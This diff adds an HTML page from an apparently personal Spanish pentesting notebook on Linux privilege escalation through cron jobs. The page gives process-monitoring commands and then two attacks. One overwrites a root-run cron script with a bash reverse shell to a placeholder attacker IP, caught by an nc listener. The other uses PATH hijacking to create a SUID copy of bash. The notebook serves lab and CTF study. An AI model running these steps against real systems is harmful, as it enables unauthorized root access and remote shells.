@@ -1,0 +1,124 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Cron | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="cron">
+          <div class="note-tabbar">
+            <span>Cron</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Linux/Tareas y automatización</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / linux / tareas y automatización</p>
+            <h2>Cron</h2>
+
+            <p>Las tareas cron son una vía común de escalada cuando ejecutan scripts modificables, rutas relativas o binarios controlables por el usuario.</p>
+
+            <h2>Enumerar Cron</h2>
+            <p><a href="https://github.com/DominicBreuker/pspy/releases">pspy</a></p>
+            <section class="code-card">
+              <h3>PSPY: Monitorizar Ejecuciones en Busca de Cron</h3>
+              <pre><code>wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+chmod +x pspy64
+./pspy64</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>procmon.sh: Alternativa a pspy</h3>
+              <pre><code>#!/bin/bash
+
+old_process=$(ps -eo command)
+
+while true; do
+    new_process=$(ps -eo command)
+	diff &lt;(echo &quot;$old_process&quot;) &lt;(echo &quot;$new_process&quot;) | grep &quot;[\&gt;\&lt;]&quot; | grep -v &quot;procmon.sh&quot; | grep -v &quot;command&quot;
+	old_process=$new_process
+done</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Localizar cron que se ejecuta como root</h3>
+              <pre><code>cat /etc/crontab    # Enumerar archivos cron y ver si tenemos permisos de lectura o escritura
+
+# Revisar Permisos del Binario que ejecuta Cron
+# Revisar Código para evaluar Path Hijacking o Links Simbólicos</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Ver si podemos editar compress.sh</h3>
+              <pre><code>ls -l /usr/local/bin/compress.sh</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>/usr/local/bin/compress.sh</h3>
+              <pre><code>#!/bin/bash
+
+bash -i &gt;&amp; /dev/tcp/&lt;kali_ip&gt;/443 0&gt;&amp;1</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Listener: Esperar que se ejecute el Cron con el one liner</h3>
+              <pre><code>nc -nlvp 443</code></pre>
+            </section>
+            <h2>Cron Path Hijacking</h2>
+            <section class="code-card">
+              <h3>Localizar cron que se ejecuta de forma relativa como root</h3>
+              <pre><code>cat /etc/crontab    # Enumerar archivos cron
+locate overwrite.sh # Ver ruta absoluta del ejecutable
+echo $PATH          # Ver PATH para ver donde suplantar el ejecutable</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>overwrite.sh: Suplantar este binario en una ruta anterior como /home/user</h3>
+              <pre><code>#!/bin/bash
+
+cp /bin/bash /tmp/bash # Copiar bash a /tmp
+chmod +xs /tmp/bash    # Asignar SUID al binario /tmp/bash</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Dar permisos de ejecución y esperar que obtenga SUID</h3>
+              <pre><code>chmod +x overwrite.sh</code></pre>
+            </section>
+            <p><a href="https://gtfobins.github.io/gtfobins/bash/#suid">GTFOBins SUID Bash</a></p>
+
+            <h2>Máquinas relacionadas</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=bashed">Bashed</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>linux</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>cron</span>
+              <span>pspy</span>
+              <span>procesos</span>
+              <span>path_hijacking</span>
+              <span>suid</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
